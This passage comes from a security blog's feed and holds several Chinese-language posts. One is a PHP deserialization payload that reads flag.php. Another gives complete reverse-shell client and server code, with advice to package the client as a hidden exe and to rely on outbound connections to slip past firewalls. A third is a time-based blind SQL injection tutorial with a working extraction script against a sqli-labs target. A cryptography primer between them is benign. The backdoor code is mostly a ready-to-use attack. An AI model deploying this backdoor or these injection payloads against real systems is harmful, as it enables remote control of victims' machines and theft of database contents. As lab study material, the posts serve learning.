class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$a</span>-&gt;source = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;str = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$d</span>;<br><br><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br></code></pre></td></tr></table></figure><p>其实最终利用代码怎么写完全取决于个人习惯，主要的还是如何寻找利用链的思路。</p><p>希望这种反推的思路能够帮助大家。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python简单远联</title>
    <link href="/2023/07/21/Python%E7%AE%80%E5%8D%95%E8%BF%9C%E8%81%94/"/>
    <url>/2023/07/21/Python%E7%AE%80%E5%8D%95%E8%BF%9C%E8%81%94/</url>
    
    <content type="html"><![CDATA[<p><strong>Python 提供了两个级别访问的网络服务：</strong></p><ul><li>低级别的网络服务支持基本的 Socket，它提供了标准的 BSD Sockets API，可以访问底层操作系统Socket接口的全部方法。</li><li>高级别的网络服务模块 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。</li></ul><h2 id="什么是-Socket"><a href="#什么是-Socket" class="headerlink" title="什么是 Socket?"></a>什么是 Socket?</h2><p>Socket又称”套接字”，应用程序通常通过”套接字”向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。</p><h2 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a>socket()函数</h2><p>Python 中，我们用 socket() 函数来创建套接字，语法格式如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">socket</span>.socket([<span class="hljs-keyword">family</span>[, <span class="hljs-class"><span class="hljs-keyword">type</span>[, proto]]])</span><br></code></pre></td></tr></table></figure><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li>family: 套接字家族可以是 AF_UNIX 或者 AF_INET</li><li>type: 套接字类型可以根据是面向连接的还是非连接分为<code>SOCK_STREAM</code>或<code>SOCK_DGRAM</code></li><li>proto: 一般不填默认为0.</li></ul><p><strong>Socket 对象(内置)方法</strong></p><table><thead><tr><th><strong>服务器端套接字</strong></th><th></th></tr></thead><tbody><tr><td>s.bind()</td><td>绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。</td></tr><tr><td>s.listen()</td><td>开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</td></tr><tr><td>s.accept()</td><td>被动接受TCP客户端连接,(阻塞式)等待连接的到来</td></tr></tbody></table><table><thead><tr><th><strong>客户端套接字</strong></th><th></th></tr></thead><tbody><tr><td>s.connect()</td><td>主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td></tr><tr><td>s.connect_ex()</td><td>connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</td></tr></tbody></table><table><thead><tr><th><strong>公共用途的套接字函数</strong></th><th></th></tr></thead><tbody><tr><td><strong>s.recv()</strong></td><td>接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</td></tr><tr><td><strong>s.send()</strong></td><td>发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</td></tr><tr><td>s.sendall()</td><td>完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</td></tr><tr><td>s.recvfrom()</td><td>接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</td></tr><tr><td>s.sendto()</td><td>发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td></tr><tr><td><strong>s.close()</strong></td><td>关闭套接字</td></tr><tr><td>s.getpeername()</td><td>返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td></tr><tr><td>s.getsockname()</td><td>返回套接字自己的地址。通常是一个元组(ipaddr,port)</td></tr><tr><td>s.setsockopt(level,optname,value)</td><td>设置给定套接字选项的值。</td></tr><tr><td>s.getsockopt(level,optname[.buflen])</td><td>返回套接字选项的值。</td></tr><tr><td>s.settimeout(timeout)</td><td>设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td></tr><tr><td>s.gettimeout()</td><td>返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td></tr><tr><td>s.fileno()</td><td>返回套接字的文件描述符。</td></tr><tr><td>s.setblocking(flag)</td><td>如果 flag 为 False，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用 recv() 没有发现任何数据，或 send() 调用无法立即发送数据，那么将引起 socket.error 异常。</td></tr><tr><td>s.makefile()</td><td>创建一个与该套接字相关连的文件</td></tr></tbody></table><p><strong>python中subprocess模块</strong>：  </p><p>subprocess可以帮我们执行命令，获取执行结果及返回内容。</p><p>subprocess中有如下几种方法，我们用的是其中的run方法，这里详细说一下subprocess.run方法</p><p>subprocess.run，subprocess.getoutput，subprocess.Popen、subprocess.call</p><p><strong>subprocess.run()</strong></p><p>此方法为python3.5版本后的推荐方法，可以获取执行结果、返回内容等一些常用的信息， 满足大部分开发需要。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">subprocess.<span class="hljs-built_in">run</span>(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">input</span>=None, <span class="hljs-attribute">stdout</span>=None,  <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">capture_output</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">cwd</span>=None, <span class="hljs-attribute">timeout</span>=None,  <span class="hljs-attribute">check</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">encoding</span>=None, <span class="hljs-attribute">errors</span>=None, <span class="hljs-attribute">text</span>=None, <span class="hljs-attribute">env</span>=None,  <span class="hljs-attribute">universal_newlines</span>=None)<br></code></pre></td></tr></table></figure><p><strong>args</strong>： 要执行的命令。类型为str（如 “ls -l”）或包含str的list，tuple等（如 [“ls”, “-l”]）, 推荐使用list形式，如果传入的args为str且包含参数，则 必须shell&#x3D;True，默认为False。</p><p><strong>stdin、stdout、stderr</strong>：  子进程的标准输入、输出、错误，常用的为stdout，我们可以获取命令执行后的输出内容。</p><p><strong>shell：</strong>如果该参数为 True，将通过操作系统的 shell 执行指定的命令，默认为False。</p><p><strong>timeout：</strong>设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。</p><p><strong>check：</strong>如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。</p><p><strong>encoding</strong>: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。</p><p><strong>capture_output</strong>： 设置为True，将捕获stdout和stderr，从而获执行命令后取返回的内容。</p><p>————————————————————————————————————————————-</p><p>好的，了解过这些基础方法的用法之后，我们可以试着自己写一个简单的远联：</p><p><strong>客户端代码思路：</strong></p><p>1.我们需要去连接服务端开启监听的IP对应的端口。</p><p>2.接收服务端下达给我们的指令</p><p>3..我们利用subprocess去定义一个方法用来将执行命令的结果进行接收并返回给服务端</p><p>下面我们写<strong>客户端</strong>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">host = <span class="hljs-string">&#x27;8.8.8.8&#x27;</span><br>port = <span class="hljs-number">8888</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_command</span>(<span class="hljs-params">comm: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">return</span> subprocess.run(shlex.split(comm), shell=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<br><br><br>client = socket.socket()<br>client.connect((host, port))<br><br><span class="hljs-comment"># 受害者接收指令，并执行指令，并返回结果</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = client.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># 受害者接收指令</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]执行命令\t<span class="hljs-subst">&#123;cmd&#125;</span>&#x27;</span>)<br>    info = run_command(cmd).stdout.decode(<span class="hljs-string">&#x27;gbk&#x27;</span>).strip()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]命令执行结果：\t<span class="hljs-subst">&#123;info&#125;</span>&#x27;</span>)<br>    client.send(info.encode(<span class="hljs-string">&#x27;gbk&#x27;</span>))<br><br><span class="hljs-comment">#      pyinstaller -F -w 客户端.py  将受害者的py文件打包为exe</span><br></code></pre></td></tr></table></figure><p><strong>服务端代码思路：</strong></p><p>1.首先我们需要利用socket在本地端口开启监听，让客户端主动连过来。</p><p>(为什么要将服务端设置在本地？      原因：如果我们主动去对靶机进行连接，这时候防护设备估计就会给你直接杀了。但是我们让靶机主动连过来的话，防护设备就会以为是靶机用户的主动行为操作，出站规则不会像进站那样严格。)</p><p>2.如果我们不止连接一台靶机的话可以在本地开启初始化连接数量。</p><p>3.如果客户端长时间未连接怎么办？——可以在服务端设置阻塞模式，一直等待客户端链接</p><p>4.我们需要发送给客户端靶机要执行的命令</p><p>5.我们需要接收客户端执行命令的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">server = socket.socket()<br>server.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">8888</span>))  <span class="hljs-comment"># 在本地的8888端口设置监听</span><br>server.listen(<span class="hljs-number">3</span>)  <span class="hljs-comment"># 初始化可连接数量为 3</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]控制端运行中，等待受害者连接......&#x27;</span>)<br>pip, b = server.accept()  <span class="hljs-comment"># 等待客户端连接，如果客户端未连接，处于阻塞状态</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]接收到来自客户端<span class="hljs-subst">&#123;b[<span class="hljs-number">0</span>]&#125;</span>,端口<span class="hljs-subst">&#123;b[<span class="hljs-number">1</span>]&#125;</span>的连接请求&#x27;</span>)<br><br><span class="hljs-comment"># 发送指令，接收执行结果</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt; &#x27;</span>).strip()  <span class="hljs-comment"># 接收攻击者传入的指令</span><br>    pip.send(cmd.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))  <span class="hljs-comment"># 下达指令给受害者</span><br>    info = pip.recv(<span class="hljs-number">4096</span>).strip().decode(<span class="hljs-string">&#x27;gbk&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]---------------执行结果-----------------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(info)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]---------------执行结果-----------------&#x27;</span>)<br><br>**************************************<br>菜鸡分享学习点滴，望大佬们多多包涵。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学简单分析</title>
    <link href="/2023/07/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <url>/2023/07/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p><strong>首先简单认识一下https建立过程：</strong></p><p>第一步：客户端向服务端发起请求</p><p>第二步：服务端响应请求，会带着数字证书（包含服务端公钥）</p><p>第三步：客户端收到后，取出公钥，并生成随机码KEY（这里的KEY就是双方后面通信的对称加密密钥），用服务端公钥对KEY进行加密，返回给服务端</p><p>第四步：服务端收到用自己的私钥解密，拿出KEY</p><p>第五步：返回给客户端用KEY加密的数据</p><p>第六步：客户端用KEY进行解密。</p><p>其中用到了两种加密方式，一种是对称加密（KEY），一种是非对称加密（公私钥）</p><p>其实对称和非对称就看有几把钥匙：</p><p>一把钥匙两个人用就是对称加密。</p><p>一人两把钥匙就是非对称加密。</p><p>下面我们分别挑一个浅浅的分析一下</p><p><strong>非对称加密：</strong></p><p>非对称加密也叫公开密码体制，每个人都有一对密钥。</p><p>一个是公钥（PK），一个是私钥（SK）</p><p>两个密钥直接存在某种算法联系，但由一个密钥没办法或者很难推导出另一个密钥。</p><p>首先“公钥”顾名思义就是公开的密钥，他可以被任何人看到。</p><p>“私钥”就是私人的钥匙，也就是说只有某个人才有，而且他不会被任何人看到。</p><ul><li>公钥加密，私钥解密——目的是为了保证将数据发给具体的人。（保密通信）</li></ul><p>助解：因为公钥A是大家都能看到的，每个人都可以用公钥A对自己的数据进行加密，但是只有拿着对应私钥A的人才能解开。其他人用自己的私钥是没办法解开经过公钥A加密的数据。</p><ul><li>私钥加密，公钥解密——目的是为了保证数据由某个具体的人发出的。（数字签名认证）</li></ul><p>助解：因为私钥A只有一个特定的人（小明）有，小明用自己的私钥对数据进行加密。大家用所有的公钥对数据进行解密，但发现只有公钥A才能解开加密的数据。所以大家可以知道这个数据是由小明发出的。</p><p>公钥加密体系采取将公钥和公钥的主人名字联系在一起的方法，再请一个有信誉的公正权威机构对每个公钥和所有者身份进行确认，确认后的公钥信息加上这个权威机构的签名，就形成了数字证书，也称为证书。</p><p>有了数字证书之后，互联网上的庞大用户群之间可以通过权威机构建立起基本的信任关系。</p><p>公开密码体制的优点：</p><ol><li>密钥分配相对简单，不需要复杂的流程；</li><li>密钥的保存量少，且私钥和公钥分别存储；</li><li>可以实现互不相识的人之间进行私人通信时的保密性要求；</li><li>可以完成通信双方的数字签名和数字身份鉴别。</li></ol><p><strong>RSA（非对称）：</strong></p><p>RSA体制基于“大数分解和素数(prime number)检测”这一著名数论难题：</p><p>将两个大素数相乘十分容易，但将该乘积分解为两个大素数因子却极端困难；</p><p>素数检测就是判定一个给定的正整数是否为素数</p><p>整数的因子分解问题：将两个素数11927和20903相乘，可以很容易地得出249310081。但是将它们的积249310081分解因子得出上述两个素数却要困难得多。</p><p>RSA算法之所以具有安全性，是基于数论中的一个特性事实：将两个大的素数合成一个大数很容易，而逆过程则非常困难。</p><p><strong>RSA的优缺点：</strong></p><p><strong>优点：</strong></p><p>1.保密强度高</p><p>2.密钥分配及管理简便</p><p>3.可以用于数字签名实现身份认证</p><p><strong>缺点：</strong></p><ol><li>运算复杂，速度慢：硬件实现时，RSA比DES要慢大约1000倍，软件实现时，RSA比DES要慢大约100倍。</li></ol><p><strong>其他非对称加密：DSA，ECC</strong></p><p><strong>对称密码体制：</strong></p><p>对称密码体制对明文加密有两种方式：</p><p><strong>序列密码（流密码，Stream Cipher）</strong></p><p><strong>分组密码 (Block Cipher)</strong></p><p>.</p><p>.</p><p><strong>序列密码原理：</strong></p><p>以明文的比特为加密单位，用某一个伪随机序列作为加密密钥，与明文进行异或运算，获得密文序列；</p><p>在接收端，用相同的随机序列与密文进行异或运算便可恢复明文序列。</p><p><img src="https://ice.frostsky.com/2023/08/15/32d54609d554518d7bf3cb33e93c38ba.png" alt="img"></p><p>序列密码算法的安全强度完全取决于伪随机序列的好坏，因此关键问题是：伪随机序列发生器的设计。</p><p><strong>优点：</strong></p><p>1.错误扩散小（一个码元出错不影响其它码元）；</p><p>2.速度快、实时性好；</p><p>3.安全程度高。</p><p><strong>缺点：</strong></p><p>密钥需要同步</p><p><strong>分组密码 (Block Cipher)</strong></p><p>分组密码（ Block Cipher）加密是在密钥的控制之下，将定长的明文块转换成等长密文的技术。当前的许多分组密码采用64位分组大小，但为了提高安全性，这一长度可能会增加。</p><p>原理：</p><p>将明文序列以固定长度（ Fixed length）进行分组，每一组明文用相同的密钥和加密函数进行运算。</p><p><img src="https://ice.frostsky.com/2023/08/15/a832bce40945c4810a575442114e45f9.png" alt="img"></p><p>优缺点：</p><p>容易检测出对信息的篡改，且不需要密钥同步，具有很强的适应性；</p><p>（与序列密码相比）分组密码在设计上的自由度小。</p><p>最典型分组密码是DES数据加密标准，它是单钥密码体制的最成功的例子。</p><p><strong>DES（对称）：</strong></p><p>加密过程：</p><p><img src="https://ice.frostsky.com/2023/08/15/a6837b71754583088273f5ca9cf62dd9.png" alt="img"></p><p>初始置换对输入的比特位置进行调整。</p><p>通过初始置换表实现</p><p>初始置换的功能</p><p>举例来看，输入为8位01110010</p><p>初始置换表为：</p><p><img src="https://ice.frostsky.com/2023/08/15/85601c7734ef08860e0b2a090505c5b7.png" alt="img"></p><p>则输出为：10001101</p><p>初始置换是固定公开的，因此没有密码的意义。</p><p><img src="https://ice.frostsky.com/2023/08/15/53247bac8ebef1ea9f773339ce07394d.png" alt="img"></p><p>DES系统的保密性主要取决于什么?</p><p>密钥的安全性 。</p><p>如何将密钥安全、可靠地分配给通信双方，在网络通信条件下就更为复杂，包括密钥产生、分配、存储、销毁等多方面的问题，统称为<strong>密钥管理</strong>。</p><p>密钥管理是影响DES等单钥密码体制安全的关键因素。因为即使密码算法再好，若密钥管理处理不当，也很难保证系统的安全性。</p><p><strong>其他对称加密算法：3DES，AES</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>延时注入的几种方式</title>
    <link href="/2023/07/21/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <url>/2023/07/21/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>时间盲注是盲注的一种，利用的场景是当目标无法使用布尔盲注获得数据可以使用这种基于时间的延时注入，通过页面回显延时来判断是否存在注入。</p><p>判断是否存在时间注入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.xxxxxxx.com/<span class="hljs-number">1</span>.php?id=<span class="hljs-number">1</span> &#x27; and if(num1,num2,num3)--+<br></code></pre></td></tr></table></figure><p>语义：如果num1为true则返回num2,否则返回num3</p><p>若需要判断参数是否存在注入就可以：</p><p>num1——&gt;true</p><p>num2——&gt;sleep(5)</p><p>num3——&gt;sleep(0)</p><h2 id="一、基于sleep的注入"><a href="#一、基于sleep的注入" class="headerlink" title="一、基于sleep的注入"></a>一、基于sleep的注入</h2><p><code>sleep()</code>是数据库中的一个函数，可以通过给<code>sleep()</code>传入数字从而导致查询延时。</p><p>故可以构造如下payload猜解数据库长度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>′ <span class="hljs-keyword">and</span> if(length(schema()) <span class="hljs-operator">=</span> &#123;<span class="hljs-number">1</span>&#125;,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">0</span>))–<span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><p>可以通过不断变化数字1，从而进一步猜解数据库长度。</p><p>可以构造如下payload猜解数据库的库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id <span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr(schema(),&#123;1&#125;, 1) = &#x27;</span>&#123;chr(<span class="hljs-number">32</span>)&#125;<span class="hljs-string">&#x27; , sleep(2), sleep(0)) --+</span><br></code></pre></td></tr></table></figure><p>**<code>chr()</code>**：将ASCII码转为对应的字符</p><p>**<code>substr(a,b,c)</code>**： 从b位置开始，截取字符串a的长度为c</p><p>可以通过变化1和32从而确定数据库库名</p><p><strong>附上sqlilabs的Less-9的盲注脚本如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment">#修改payload</span><br><br><br>db_len = <span class="hljs-number">0</span> <span class="hljs-comment">#数据库的长度是</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    start = time.time()   <span class="hljs-comment">#获取执行前时间</span><br>    requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(length(schema()) = <span class="hljs-subst">&#123;i&#125;</span>, sleep(2), sleep(0)) --+&quot;</span>)<br>    end = time.time()   <span class="hljs-comment">#获取完成后的时间</span><br>    <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;数据库的长度是:<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        db_len = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, db_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        start = time.time()<br>        requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(substr(schema(), <span class="hljs-subst">&#123;i&#125;</span>, 1) = &#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span>&#x27; , sleep(2), sleep(0)) --+&quot;</span>)<br>        end = time.time()<br>        <span class="hljs-keyword">if</span> (end - start) &gt; <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j).lower(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br> <span class="hljs-comment">#猜测表的长度</span><br>table_len = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    start = time.time()   <span class="hljs-comment">#获取执行前时间</span><br>    requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(length((select group_concat(TABLE_NAME) from information_schema.TABLES where table_schema = schema()) ) = <span class="hljs-subst">&#123;i&#125;</span>,sleep(2),sleep(0)) --+&quot;</span>)<br>    end = time.time()   <span class="hljs-comment">#获取完成后的时间</span><br>    <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\n表的长度是：<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        table_len = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, table_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        start = time.time()   <span class="hljs-comment">#获取执行前时间</span><br>        requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where table_schema = schema()),<span class="hljs-subst">&#123;i&#125;</span>,1 )= &#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span>&#x27;,sleep(2),sleep(0)) --+&quot;</span>)<br>        end = time.time()   <span class="hljs-comment">#获取完成后的时间</span><br>        <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j).lower(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br> <span class="hljs-comment">#猜测列名长度</span><br>column_len = <span class="hljs-number">0</span><br>table_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;\n请输入要查询的表名&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    start = time.time()   <span class="hljs-comment">#获取执行前时间</span><br>    requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(length ((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema = schema() and table_name = &#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27;) ) = <span class="hljs-subst">&#123;i&#125;</span>,sleep(2),sleep(0)) --+&quot;</span>)<br>    end = time.time()   <span class="hljs-comment">#获取完成后的时间</span><br>    <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\n列的长度是：<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        column_len = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, column_len + <span 